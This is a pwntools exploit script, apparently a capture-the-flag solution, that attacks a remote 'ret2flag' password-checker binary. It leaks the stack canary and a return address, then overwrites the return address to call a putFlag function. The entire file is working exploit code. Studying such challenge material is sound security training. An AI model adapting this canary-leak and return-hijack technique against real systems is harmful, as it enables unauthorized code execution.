#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.binary = './ret2flag'
elf = context.binary
context.log_level = 'debug'

# Choose between local or remote exploitation
p = remote('140.113.207.245', 30174)
# p = process('./ret2flag')

# Receive the initial prompt
p.recvuntil(b"Here is another password checker, you got 5 chances to try\n")

# === Leak the Stack Canary ===
payload1 = b'A' * 24  # Fill buffer up to canary and add 'B' to prevent null termination
p.sendline(payload1)
p.recvuntil(payload1 + b"\n")
leaked_canary = p.recv(7)  # Read the 7 bytes of the canary (excluding the null byte)
log.info(f"Leaked Canary: {leaked_canary}")
canary = u64(b'\x00' + leaked_canary)
log.success(f"Leaked Canary: {hex(canary)}")

# === Leak the Return Address ===
p.recvuntil(b"Password is incorrect. Let's try again\n")
payload2 = b"A" * 24 + b"B" * 15  # Overwrite up to return address
p.sendline(payload2)
log.success(f"Sent payload2: {payload2}")

# p.recvuntil(payload2 + b"\n")
log.info(p.recvline().decode().strip())
leaked_ret = p.recvline()[:-len(b"Password is incorrect. Let's try again\n")]
log.info(f"Leaked Return Address bytes: {leaked_ret}")
leaked_ret_addr = u64(leaked_ret.ljust(8, b"\x00"))
log.info(f"Leaked Return Address: {leaked_ret}")
log.success(f"Leaked Return Address: {hex(leaked_ret_addr)}")

# === Calculate the Address of putFlag ===
# Calculate the base address of the binary
ret_offset = 0x1476  # Offset of the return address from the base
base_addr = leaked_ret_addr - ret_offset 
log.info(f"Calculated Base Address: {hex(base_addr)}")

# Calculate the address of putFlag
putflag_offset = 0x1269  # Offset of putFlag from the base
putflag_addr = base_addr + putflag_offset
log.success(f"Calculated putFlag Address: {hex(putflag_addr)}")

# === Send the Final Payload ===
payload_final = b"A" * 24  # Fill buffer
payload_final += p64(canary)  # Insert the correct canary
payload_final += b"B" * 8  # Overwrite saved RBP
payload_final += p64(putflag_addr)  # Overwrite return address with putFlag

# p.recvuntil(b"Password is incorrect. Let's try again\n")
p.sendline(payload_final)

p.recvuntil(b"Password is incorrect. Let's try again\n")
p.sendline(payload_final)
p.recvuntil(b"Password is incorrect. Let's try again\n")
p.sendline(payload_final)

# Receive and print the flag
print(p.recvline().decode().strip())
flag = p.recvline().decode().strip()
log.success(f"\033[93;1mFlag: {flag}\033[0m")
p.close()
